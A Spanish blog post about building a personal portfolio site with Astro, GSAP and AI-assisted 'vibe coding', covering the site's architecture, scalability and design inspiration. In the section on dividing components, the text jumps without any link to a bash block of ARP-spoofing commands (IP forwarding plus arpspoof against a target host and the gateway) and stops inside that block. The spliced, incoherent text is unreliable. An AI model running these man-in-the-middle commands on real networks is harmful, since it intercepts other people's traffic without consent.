---
title: "JF_ Página Web"
description: "Cómo crear una página web como esta con los conocimientos básicos de Programación Web e IA."
pubDate: 2026-03-12
tags: ["Astro", "Vibe Coding", "Html", "Css", "Gsap"]
---

En este blog enseñaré cómo, con los conocimientos básicos de programación web y con inteligencia artificial, he creado esta página web estática, desde la elección de las herramientas de desarrollo hasta las últimas optimizaciones, pasando por los objetivos del portfolio y su diseño. Por último, añadiré mi opinión actual del *vibe coding* basada en el desarrollo de este proyecto el cual dejaré open source para cualquiera que se quiera inspirar en el.  

## 1. Objetivos

Cuando pensé en cómo quería mi página web, pensé en un portfolio original con un blog para añadir todos mis proyectos de hacking. Lo más importante era la modularidad entre secciones para modificar algo cuando quiera y la escalabilidad para que, a medida que vaya creciendo el blog, tenga que tocar el menor código posible.

### 1.1 Arquitectura
¿Cómo creas la arquitectura de una página web sin tener ninguna experiencia? Se lo preguntas a la inteligencia artificial. Así es como surgió la siguiente estructura:

```text
📁 raíz-del-proyecto/
├── 📁 public/
└── 📁 src/
    ├── 📁 assets/
    ├── 📁 components/
    │   ├── 📁 about/
    │   │   └── 📄 About.astro
    │   ├── 📁 blog/
    │   │   ├── 📄 FeaturedBlogs.astro
    │   │   └── 📄 LavaLampBackground.astro
    │   ├── 📁 home/
    │   │   ├── 📄 CodeMaskLayer.astro
    │   │   └── 📄 NameLayer.astro
    │   ├── 📄 navbar.astro
    │   └── 📄 SamoyedGame.astro
    ├── 📁 content/
    │   └── 📁 blog/
    ├── 📁 i18n/
    ├── 📁 icons/
    ├── 📁 layouts/
    └── 📁 pages/
        ├── 📁 blog/
        ├── 📁 en/
        ├── 📁 va/
        └── 📄 index.astro
```

Desconozco si es la arquitectura más eficiente, no me merece la pena invertir el tiempo de investigación (no soy desarrollador web; si lo fuera, lo haría), pero de momento cumple con su función perfectamente.

### 1.2 Escalabilidad y Rapidez
El factor que más me preocupaba era la escalabilidad del blog; quería que fuera lo más simple posible. Actualmente, solo tengo que crear un archivo .md en español en la carpeta src/content/blog/es, escribir el post con el formato Markdown, y realizar las traducciones con inteligencia artificial para ahorrar tiempo. Una vez hecho, creo los archivos en/ y va/.

### 1.3 ¿Por qué Astro?
Astro es una muy buena decisión si quieres programar páginas web estáticas, además, la cantidad de contenido de paginas web creadas por [Midudev](https://www.youtube.com/@midulive/playlists) en su canal de youtube son el tutorial perfecto para entender la herramienta.

## 2. Diseño Web

Personalmente, esta ha sido mi parte favorita. En el siguiente [enlace](https://www.awwwards.com/websites/gsap/) tienes una recopilación de páginas web con GSAP. En esa plataforma están los mejores programadores del mundo, ahí la gente está loca. 

Navegando por ahí me encontré con la página web de [WHITEOUT_WORKS](https://www.whiteoutworks.com/) y, en el momento en que la vi, me imaginé cómo quería que fuera mi portfolio. Tener este tipo de referencias para gente *amateur* en diseño es una maravilla. 

![Página web de WHITEOUT_WORKS](./WHITEOUT_WORKS.webp)

### 2.1 Divide y vencerás
La inteligencia artificial es muy perezosa, si le dás una misión genérica recibirás un resultado muy cutre, pero si le das un promt muy concreto puede hacer maravillas. Por eso, creé la siguiente estratégia: En astro se separan las partes de la página web en componentes, pues la idea es dividir estos en subcomponentes que cumplan un objetivo sólo a menos que no sea posible.

Podemos hacerlo fácilmente con herramientas como `arpspoof` o `bettercap`. En una terminal, ejecutaríamos algo similar a esto:

```bash
# Habilitar el reenvío de IP para no dejar sin internet al dispositivo
echo 1 > /proc/sys/net/ipv4/ip_forward

# Engañar al dispositivo (Target IP)
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1

# Engañar al router (Gateway IP)
arpspoof -i eth0 -t 192.168.1.1 192.168.1.50